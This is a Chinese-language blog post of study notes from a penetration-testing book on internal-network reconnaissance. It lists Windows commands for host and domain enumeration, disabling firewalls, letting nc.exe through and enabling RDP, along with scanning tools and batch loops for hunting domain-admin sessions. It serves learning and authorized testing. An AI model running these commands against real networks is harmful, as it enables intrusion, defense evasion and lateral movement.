<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>内网渗透 - 饱食终日，无所事事</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="饱食终日，无所事事"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="饱食终日，无所事事"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="《内网安全攻防——渗透测试实战指南》笔记"><meta property="og:type" content="blog"><meta property="og:title" content="内网渗透"><meta property="og:url" content="http://example.com/2020/07/29/intranet/"><meta property="og:site_name" content="饱食终日，无所事事"><meta property="og:description" content="《内网安全攻防——渗透测试实战指南》笔记"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:published_time" content="2020-07-29T02:55:55.000Z"><meta property="article:modified_time" content="2020-10-19T07:00:31.986Z"><meta property="article:author" content="lll"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2020/07/29/intranet/"},"headline":"饱食终日，无所事事","image":["http://example.com/img/og_image.png"],"datePublished":"2020-07-29T02:55:55.000Z","dateModified":"2020-10-19T07:00:31.986Z","author":{"@type":"Person","name":"lll"},"description":"《内网安全攻防——渗透测试实战指南》笔记"}</script><link rel="canonical" href="http://example.com/2020/07/29/intranet/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="饱食终日，无所事事" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-07-29T02:55:55.000Z" title="2020-07-29T02:55:55.000Z">2020-07-29</time>发表</span><span class="level-item"><time dateTime="2020-10-19T07:00:31.986Z" title="2020-10-19T07:00:31.986Z">2020-10-19</time>更新</span><span class="level-item">1 小时读完 (大约6891个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">内网渗透</h1><div class="content"><p>《内网安全攻防——渗透测试实战指南》笔记</p>
<a id="more"></a>

<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>信息收集目标：</p>
<ul>
<li>判断当前机器角色，是普通 Web 服务器、开发测试服务器、公共服务器、文件服务器、代理服务器、DNS 服务器还是存储服务器等等</li>
<li>判断当前机器所处网络环境的拓扑结构，是对所处内网进行全面的信息收集，和分析整理，绘制大概的内网整体拓扑结构图</li>
<li>判断当前机器所处区域，是指判断当前按机器处于网络拓扑中的哪个位置，是在 DMZ 区、办公区还是核心区</li>
</ul>
<h3 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h3><h4 id="手动收集"><a href="#手动收集" class="headerlink" title="手动收集"></a>手动收集</h4><p>本机信息包括系统、权限、内网 IP 地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，操作系统、应用软件、补丁、服务、杀毒软件一般是一键安装的。</p>
<p>相关命令：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>ipconfig /all</code></td>
<td>获取本机网络配置信息</td>
</tr>
<tr>
<td>``systeminfo</td>
<td>findstr /B /C:”OS Name” /C:”OS Version”``</td>
</tr>
<tr>
<td><code>echo %PROCESSOR_ARCHITECTURE%</code></td>
<td>查看系统架构</td>
</tr>
<tr>
<td><code>wmic product get name,version</code></td>
<td>查看安装软件信息</td>
</tr>
<tr>
<td>``powershell “GET-WmiObject -class Win32_Product</td>
<td>Select-Object -Property name,version”``</td>
</tr>
<tr>
<td><code>wmic service list brief</code></td>
<td>查看服务信息</td>
</tr>
<tr>
<td><code>tasklist</code></td>
<td>查看进程信息</td>
</tr>
<tr>
<td><code>wmic process list brief</code></td>
<td>查看进程信息</td>
</tr>
<tr>
<td><code>wmic startup get command,caption</code></td>
<td>查看启动程序信息</td>
</tr>
<tr>
<td><code>schtasks /query /fo LIST /v</code></td>
<td>查看计划任务</td>
</tr>
<tr>
<td><code>net statistics workstation</code></td>
<td>查看开机时间</td>
</tr>
<tr>
<td><code>net user</code></td>
<td>查看用户列表，可以寻找用户命名规律</td>
</tr>
<tr>
<td><code>net localgroup administrators</code></td>
<td>查看本地管理员，有时会有域用户被添加为域机器的本地管理员</td>
</tr>
<tr>
<td><code>net session</code></td>
<td>列出或断开本地计算机域所连接的客户端之间的会话</td>
</tr>
<tr>
<td><code>netstat -ano</code></td>
<td>查看端口信息</td>
</tr>
<tr>
<td><code>system info</code></td>
<td>查看补丁信息</td>
</tr>
<tr>
<td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td>
<td>查看安装在系统中的补丁</td>
</tr>
<tr>
<td><code>net share</code></td>
<td>查看本机共享列表</td>
</tr>
<tr>
<td><code>wmic share name,path,status</code></td>
<td>查看本机共享列表</td>
</tr>
<tr>
<td><code>route print</code></td>
<td>查看路由表</td>
</tr>
<tr>
<td><code>arp -a</code></td>
<td>查看MAC地址</td>
</tr>
<tr>
<td><code>netsh firewall show config</code></td>
<td>查看防火墙配置</td>
</tr>
<tr>
<td><code>netsh firewall set opmode disable</code></td>
<td>Windows Server 2003及以前的版本，禁用防火墙</td>
</tr>
<tr>
<td><code>netsh advfirewall set allprofiles state off</code></td>
<td>Windows Server 2003 之后版本，禁用防火墙</td>
</tr>
<tr>
<td><code>netsh firewalll add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</code></td>
<td>Windows Server 2003 之前，允许 nc 全部连接</td>
</tr>
<tr>
<td><code>netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</code></td>
<td>Windows Server 2003之后，允许 nc 进入</td>
</tr>
<tr>
<td><code>netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</code></td>
<td>Windows Server 2003 之后，允许 nc 出</td>
</tr>
<tr>
<td><code>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocal=TCP dir=in localport=3389 action=allow</code></td>
<td>Windows Server 2003之后，允许3389</td>
</tr>
<tr>
<td><code> netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</code></td>
<td>自定义防火墙日志文件位置</td>
</tr>
<tr>
<td><code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</code></td>
<td>查看代理配置情况</td>
</tr>
<tr>
<td><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></td>
<td>查看远程连接端口(十六进制)</td>
</tr>
<tr>
<td><code>wmic path win32_terminalservicesetting where (__classCLASS !=&quot;&quot;) call setallowtsconnections 1</code></td>
<td>Windows Server 2003 开启 3389 端口</td>
</tr>
<tr>
<td><code>wmic /namespace:\\root\cimv2\terminalservices path win32_terminalsetting where (__class !=&quot;&quot;) call setallowtsconnections 1</code></td>
<td>Windows Server 2008 和 2012 开启3389端口</td>
</tr>
<tr>
<td><code>wmic /namespace:\\root\cimv2\terminalservices path win32_terminalgeneralsetting where (TermicalName=&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1</code></td>
<td>Windows Server 2008 和 2012 开启3389端口</td>
</tr>
<tr>
<td><code>reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DOWRD /d 0 /f</code></td>
<td>Windows Server 2008 和 2012 开启3389端口</td>
</tr>
</tbody></table>
<p>常见杀软进程名称：</p>
<table>
<thead>
<tr>
<th>进程</th>
<th>软件</th>
</tr>
</thead>
<tbody><tr>
<td>360sd.exe</td>
<td>360杀毒</td>
</tr>
<tr>
<td>360tray.exe</td>
<td>360实时防护</td>
</tr>
<tr>
<td>ZhuDongFangYu.exe</td>
<td>360主动防御</td>
</tr>
<tr>
<td>KSafeTray.exe</td>
<td>金山卫士</td>
</tr>
<tr>
<td>SafeDogUpdateCenter.exe</td>
<td>服务器安全狗</td>
</tr>
<tr>
<td>McAfee McShield.exe</td>
<td>McAfee</td>
</tr>
<tr>
<td>egui.exe</td>
<td>NOD32</td>
</tr>
<tr>
<td>AVP.EXE</td>
<td>卡巴斯基</td>
</tr>
<tr>
<td>avguard.exe</td>
<td>小红伞</td>
</tr>
<tr>
<td>bdagent.exe</td>
<td>BitDefender</td>
</tr>
</tbody></table>
<h4 id="自动收集"><a href="#自动收集" class="headerlink" title="自动收集"></a>自动收集</h4><p>使用 WMIC(Windows Management Instrumentation Command-Line)，脚本自动获取所需的信息。默认情况下，任何版本的 Windows XP 的低权限用户不能访问 WMIC，Windows 7 以上版本的低权限用户允许访问 WMIC 并执行相关查询操作，推荐脚本：<a href="wmic_info.bat">wmic_info.bat</a></p>
<h4 id="Empire-下的主机信息收集"><a href="#Empire-下的主机信息收集" class="headerlink" title="Empire 下的主机信息收集"></a>Empire 下的主机信息收集</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness<span class="regexp">/host/</span>winenum</span><br><span class="line">usemodule situational_awareness<span class="regexp">/host/</span>computerdetails</span><br></pre></td></tr></table></figure>

<h3 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h3><p>如果内网中存在域，本地普通用户只能查询本机信息，无法查询域内信息；本地管理员和域用户可以查询域内信息。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>whoami</code></td>
<td>查询当前权限</td>
</tr>
<tr>
<td><code>whoami /all</code></td>
<td>查询域 SID</td>
</tr>
<tr>
<td><code>net user username /domain</code></td>
<td>查询指定用户的详细信息</td>
</tr>
</tbody></table>
<h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><p>获取了本机信息之后，需要判断内网中是否存在域，如果存在，当前主机是否在域内。通常有多种方法。</p>
<h4 id="查看网络配置"><a href="#查看网络配置" class="headerlink" title="查看网络配置"></a>查看网络配置</h4><p>使用 <code>ipconfig /all</code> 查看网关 IP 地址、DNS IP地址、域名、本机是否和 DNS 处于同一网段等信息，然后通过反向解析查询命令 <code>nslookup example.domainname</code> 解析域名的 IP 地址，判断域控制器和 DNS 服务器是否是同一台服务器。</p>
<h4 id="查看系统详细信息"><a href="#查看系统详细信息" class="headerlink" title="查看系统详细信息"></a>查看系统详细信息</h4><p>使用 <code>systeminfo</code> 查看系统详细信息，域 为域名，如果 域 为 WORKGROUP 则本机不在域内，登陆服务器为域控。</p>
<h4 id="查询当前登陆域及登录用户信息"><a href="#查询当前登陆域及登录用户信息" class="headerlink" title="查询当前登陆域及登录用户信息"></a>查询当前登陆域及登录用户信息</h4><p>使用 <code>net config workstation</code>，工作站域 DNS 名称为域名，登陆域表示当前登录用户是域用户或者本地用户，</p>
<h4 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h4><p>使用 <code>net time /domain</code> 查询时间，由于与服务器通常会同时作为时间服务器，可以用于判断主域。执行结果分为以下几种情况：</p>
<ul>
<li><p>存在域，但当前用户不是域用户</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发生系统错误 <span class="number">5</span></span><br><span class="line">拒绝访问</span><br></pre></td></tr></table></figure>
</li>
<li><p>存在域，且当前用户是域用户</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\DC.hacke.testlab 的当前时间是 <span class="number">2020</span>/<span class="number">7</span>/<span class="number">29</span> <span class="number">18</span>:<span class="number">04</span>:<span class="number">07</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>当前网络环境为工作组，不存在域</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">找不到域 WORKGROUP 的域控制器</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h3><h4 id="使用-NetBIOS-快速探测内网"><a href="#使用-NetBIOS-快速探测内网" class="headerlink" title="使用 NetBIOS 快速探测内网"></a>使用 NetBIOS 快速探测内网</h4><p>NetBIOS 是局域网程序使用的一种 API为应用程序提供了请求低级别服务的统一指令集，为局域网提供了网络及其他特殊功能，几乎所有的局域网都是在 NetBIOS协议的基础上工作的，推荐优先使用。</p>
<p>使用 nbtscan 扫描内网，<a href="nbtscan-1.0.35.exe">Windows 版</a>，<a href="nbtscan-1.0.35.exe">Linux版</a>，不输入任何参数可查看帮助</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>扫描结果第一列为 IP 地址，第二列为所在域，第三列为开启的服务</p>
<table>
<thead>
<tr>
<th>Token</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>SHARING</td>
<td>该机器中存在正在运行的文件和打印共享服务，但不一定有内容共享</td>
</tr>
<tr>
<td>DC</td>
<td>可能是域控制器</td>
</tr>
<tr>
<td>U=USER</td>
<td>可能有登录名为 USER 的用户</td>
</tr>
<tr>
<td>IIS</td>
<td>可能安装 IIS 服务器</td>
</tr>
<tr>
<td>EXCHANGE</td>
<td>可能安装了 Exchange</td>
</tr>
<tr>
<td>NOTES</td>
<td>可能安装了 Lotus Notes 电子邮件客户端</td>
</tr>
<tr>
<td>?</td>
<td>没有识别出该机器的 NetBIOS 资源，可使用 <code>-F</code>再次扫描</td>
</tr>
</tbody></table>
<h4 id="利用-ICMP-协议快速探测内网"><a href="#利用-ICMP-协议快速探测内网" class="headerlink" title="利用 ICMP 协议快速探测内网"></a>利用 ICMP 协议快速探测内网</h4><p>扫描 C 段：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">for</span> /L %I in (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) DO @ping -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%I | findstr <span class="string">&quot;TTL&quot;</span></span><br></pre></td></tr></table></figure>

<p>也可利用 VBS 脚本</p>
<h4 id="利用-ARP-探测内网"><a href="#利用-ARP-探测内网" class="headerlink" title="利用 ARP 探测内网"></a>利用 ARP 探测内网</h4><p>使用 arpscan 利用 arp 协议扫描，<a target="_blank" rel="noopener" href="https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arp-scan">Windows 版</a>，Kali 可以使用 apt 安装</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpscan.exe -t <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>也可以使用 Empire 的 <code>arpscan</code> 模块或者 Nishang 中的 <code>Invoke-ARPScan.ps1</code> 脚本</p>
<h4 id="通过常规-TCP-UDP-端口扫描探测内网"><a href="#通过常规-TCP-UDP-端口扫描探测内网" class="headerlink" title="通过常规 TCP/UDP 端口扫描探测内网"></a>通过常规 TCP/UDP 端口扫描探测内网</h4><p>使用 ScanLine 探测端口</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline -h -t <span class="number">22</span>,<span class="number">80</span><span class="number">-89</span>,<span class="number">110</span>,<span class="number">389</span>,<span class="number">445</span>,<span class="number">3389</span>,<span class="number">1433</span>,<span class="number">2049</span>  -u <span class="number">53</span>,<span class="number">161</span> -O C:\Windows\temp\log.txt -p <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span><span class="number">-254</span> /b</span><br></pre></td></tr></table></figure>

<h3 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h3><h4 id="利用-telnet-扫描"><a href="#利用-telnet-扫描" class="headerlink" title="利用 telnet 扫描"></a>利用 telnet 扫描</h4><p>如果单纯检查某个高危端口是否开放可以选择 telnet</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">telnet DC <span class="number">1433</span></span><br><span class="line">telnet <span class="number">192.168</span><span class="number">.1</span><span class="number">.4</span> <span class="number">22</span></span><br></pre></td></tr></table></figure>

<h4 id="S-扫描器"><a href="#S-扫描器" class="headerlink" title="S 扫描器"></a>S 扫描器</h4><p>S 扫描器适合运行于 Windows Server 2003 以下的机器，扫描结果默认保存在安装目录下的 result.txt 文件中，推荐使用 TCP 扫描</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S.exe TCP <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.254</span> <span class="number">445</span>,<span class="number">3389</span> /Banner /save</span><br></pre></td></tr></table></figure>

<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>Metasploit 不仅提供了多种端口扫描技术，还提供了与其他扫描工具的接口</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary<span class="regexp">/scanner/</span>portscan/tcp</span><br></pre></td></tr></table></figure>

<h4 id="PowerSploit-的-Invoke-portscan-ps1"><a href="#PowerSploit-的-Invoke-portscan-ps1" class="headerlink" title="PowerSploit 的 Invoke-portscan.ps1"></a>PowerSploit 的 Invoke-portscan.ps1</h4><h4 id="Nishang-的-Invoke-PortScan-模块"><a href="#Nishang-的-Invoke-PortScan-模块" class="headerlink" title="Nishang 的 Invoke-PortScan 模块"></a>Nishang 的 Invoke-PortScan 模块</h4><h4 id="Banner-信息"><a href="#Banner-信息" class="headerlink" title="Banner 信息"></a>Banner 信息</h4><p>扫描到开放端口后，可以使用 nc 或者客户端连接端口获取 Banner 信息，用于在漏洞库中检索对应的 POC，EXP。常用漏洞库</p>
<ul>
<li>安全焦点中的 BugTraq</li>
<li>Exploit-DB</li>
</ul>
<h3 id="收集域内基础信息"><a href="#收集域内基础信息" class="headerlink" title="收集域内基础信息"></a>收集域内基础信息</h3><p>确定当前内网的域，以及所控制的主机在域内，就可以进行域内相关信息的收集，以下的方法都是通过 LDAP 协议到域控制器上进行查询，因此只有域用户和本地 System 用户具有权限。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>net view /domain</code></td>
<td>查询域</td>
</tr>
<tr>
<td><code>net view /domain:HACKE</code></td>
<td>查询域内所有主机</td>
</tr>
<tr>
<td><code>net group /domain</code></td>
<td>查询用户组列表</td>
</tr>
<tr>
<td><code>net group &quot;domain computers&quot; /domain</code></td>
<td>查询域成员</td>
</tr>
<tr>
<td><code>net accounts /domain</code></td>
<td>获取域密码策略</td>
</tr>
<tr>
<td><code>nltest /domain_trusts</code></td>
<td>查询域信任信息</td>
</tr>
</tbody></table>
<h3 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h3><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>nltest /DCLIST:hacke</code></td>
<td>查看域控制器机器名</td>
</tr>
<tr>
<td><code>nslookup -type=SRV _ldap._tcp</code></td>
<td>查看域控制器主机名</td>
</tr>
<tr>
<td><code>net time /domain</code></td>
<td>查看时间</td>
</tr>
<tr>
<td><code>net group &quot;Domain Controllers&quot; /domain</code></td>
<td>查看域控制器组</td>
</tr>
<tr>
<td><code>netdom query pdc</code></td>
<td>查看域控制器机器名</td>
</tr>
</tbody></table>
<h3 id="获取域内用户和管理员信息"><a href="#获取域内用户和管理员信息" class="headerlink" title="获取域内用户和管理员信息"></a>获取域内用户和管理员信息</h3><h4 id="查询域用户列表"><a href="#查询域用户列表" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>net user /domain</code></td>
<td>查询用户列表</td>
</tr>
<tr>
<td><code>wmic useraccount get /all</code></td>
<td>查询域内用户详细信息</td>
</tr>
<tr>
<td><code>dsquery user</code></td>
<td>查询存在的用户</td>
</tr>
<tr>
<td><code>net localgroup administrators</code></td>
<td>查询本地管理员组用户，Domain Admins 组的用户默认为域内机器的本笃管理员用户</td>
</tr>
</tbody></table>
<h4 id="查询域管理员用户组"><a href="#查询域管理员用户组" class="headerlink" title="查询域管理员用户组"></a>查询域管理员用户组</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>net group &quot;domain admins&quot; /domain</code></td>
<td>查询域管理员用户</td>
</tr>
<tr>
<td><code>net group &quot;Enterprise Admins&quot; /domain</code></td>
<td>查询域管理员用户</td>
</tr>
</tbody></table>
<h3 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>一个域中，当计算机加入域后，会默认给域管理员组赋予本地管理员权限。</p>
<p>定位域管理员的方式，一是日志，二是会话。日志是指本地机器的管理员日志，可以通过脚本或 Wevtutil 工具导出查看。会话是指域内每台机器的登录会话，可以使用 netsess.exe 或 PowerView 等工具查询（可以匿名，不需要权限）。</p>
<h4 id="常用域管理员定位工具"><a href="#常用域管理员定位工具" class="headerlink" title="常用域管理员定位工具"></a>常用域管理员定位工具</h4><p>假设已经取得了域内普通用户的权限，希望横向移动，需要知道域内用户登录的位置、他是否是任何系统的本地管理员、他所属的组、他是否有权访问文件共享等。枚举主机、用户和组有助于了解域内布局。</p>
<p>常用域管理员定位工具有 psloggedon.exe、PVEFinADUser.exe、netsess.exe、以及 hunter、NetView 等。在 PowerShell 中，常用的是 PowerView。</p>
<h3 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h3><h4 id="本机检查"><a href="#本机检查" class="headerlink" title="本机检查"></a>本机检查</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> group </span><span class="string">&quot;Domain Admins&quot;</span> /Domain	# 查看域管理员</span><br><span class="line">tasklist /v							# 列出本机的所有进程和进程用户，在其中寻找域管理员进程</span><br></pre></td></tr></table></figure>

<h4 id="查询域控制器的域用户会话"><a href="#查询域控制器的域用户会话" class="headerlink" title="查询域控制器的域用户会话"></a>查询域控制器的域用户会话</h4><p>在域控制器中查找域用户会话列表，并将其于域管理员列表进行交叉引用，从而得到域管理会话的系统列表。</p>
<p>查询域控制器列表，可以使用 LDAP 查询从 Domain Controllers 单元中收集的域控制器列表或者使用 <code>net group &quot;Domain Controllers&quot; /domain&quot;</code></p>
<p>收集域管理员列表，可以使用 LDAP 查询或者使用 <code>net group &quot;Domain Admins&quot; /domain</code></p>
<p>收集所有活动域的会话列表，可以使用 netsess.exe，<code>NetSess -h</code></p>
<p>交叉引用域管理员列表和活动绘画列表，可以确定哪些 IP 地址有活动域令牌。将域控制器列表保存到 dcs.txt，域管理员列表保存到 admins.txt，执行</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %i <span class="keyword">in</span> (dcs.txt) <span class="keyword">do</span> @echo [+] Querying DC %i &amp;&amp; @netsess -h %i <span class="number">2</span>&gt;nul &gt;sessions.txt &amp;&amp; FOR /F %a <span class="keyword">in</span> (admins.txt) DO @type sessions.txt |findstr /I %a </span><br></pre></td></tr></table></figure>

<p>类似的也可以使用 Get Domain Admins  脚本。</p>
<h4 id="查询远程系统中运行的任务"><a href="#查询远程系统中运行的任务" class="headerlink" title="查询远程系统中运行的任务"></a>查询远程系统中运行的任务</h4><p>如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以用以下方式查询系统中的域管理员任务，将目标域系统列表添加到 ips.txt，将收集到的域管理员列表添加到 names.txt</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> group </span><span class="string">&quot;Domain Admins&quot;</span> /domain</span><br><span class="line"><span class="keyword">For</span> /F %i <span class="keyword">in</span> (ips.txt) <span class="keyword">DO</span> @echo [+] %i &amp;&amp; @tasklist /V /S %i /U<span class="built_in"> user </span>/P password 2&gt;nul &gt; output.txt &amp;&amp; <span class="keyword">FOR</span> /F %n <span class="keyword">in</span> (names.txt) <span class="keyword">DO</span> @type output.txt | findstr %n &gt; nul &amp;&amp; echo [!] %n was found running a prosess on %i &amp;&amp; pause</span><br></pre></td></tr></table></figure>

<h4 id="扫描远程系统的-NetBIOS-信息"><a href="#扫描远程系统的-NetBIOS-信息" class="headerlink" title="扫描远程系统的 NetBIOS 信息"></a>扫描远程系统的 NetBIOS 信息</h4><p>某些版本的 Windows 允许用户通过 NetBIOS 查询已登录用户，将目标域系统添加到 ips.txt，将收集到的域管理员列表添加到 admins.txt</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F <span class="name">%i</span> <span class="meta">in</span> (ips.txt) <span class="meta">do</span> @echo [+] Checking <span class="name">%i</span> <span class="variable">&amp;&amp;</span> nbtstat -A <span class="name">%i</span> 2&gt;nul &gt; nbsessions.txt <span class="variable">&amp;&amp;</span> FOR /F <span class="name">%n</span> <span class="meta">in</span> (admins.txt) <span class="meta">DO</span> @type nbsessions.txt | findstr /I <span class="name">%n</span> &gt;nul <span class="variable">&amp;&amp;</span> echo [!] <span class="name">%n</span> was found logged <span class="meta">into</span> <span class="name">%i</span></span><br></pre></td></tr></table></figure>

<p>也可以使用 nbtscan 工具，</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F <span class="name">%i</span> <span class="meta">in</span> (ips.txt) <span class="meta">do</span> @echo [+] Checking <span class="name">%i</span> <span class="variable">&amp;&amp;</span> nbtscan -f <span class="name">%i</span> 2&gt;nul &gt;nbsessions.txt <span class="variable">&amp;&amp;</span> FOR /F <span class="name">%n</span> <span class="meta">in</span> (admins.txt) <span class="meta">DO</span> @type nbsessions.txt | findstr /I <span class="name">%n</span> &gt;nul <span class="variable">&amp;&amp;</span> echo [!] <span class="name">%n</span> was found logged <span class="meta">into</span> <span class="name">%i</span></span><br></pre></td></tr></table></figure>

<h3 id="利用-PowerShell"><a href="#利用-PowerShell" class="headerlink" title="利用 PowerShell"></a>利用 PowerShell</h3><p>-</p>
<h3 id="域分析工具-BloodHound"><a href="#域分析工具-BloodHound" class="headerlink" title="域分析工具 BloodHound"></a>域分析工具 BloodHound</h3><p>-</p>
<h3 id="敏感数据的防护"><a href="#敏感数据的防护" class="headerlink" title="敏感数据的防护"></a>敏感数据的防护</h3><p>-</p>
<h3 id="分析域内网段划分情况和拓扑结构"><a href="#分析域内网段划分情况和拓扑结构" class="headerlink" title="分析域内网段划分情况和拓扑结构"></a>分析域内网段划分情况和拓扑结构</h3><p>-</p>
